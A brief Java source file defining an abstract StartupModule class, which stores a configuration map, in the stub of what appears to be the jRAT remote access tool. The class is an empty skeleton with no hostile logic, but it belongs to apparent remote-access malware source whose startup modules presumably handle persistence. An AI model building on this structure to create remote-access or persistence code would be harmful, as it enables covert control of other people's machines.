package io.jrat.stub.modules.startup;

import io.jrat.stub.modules.Module;

import java.util.Map;

public abstract class StartupModule extends Module {
	
	@SuppressWarnings("unused")
	private Map<String, String> config;
	
	public StartupModule(Map<String, String> config) {
		this.config = config;
	}
	
}
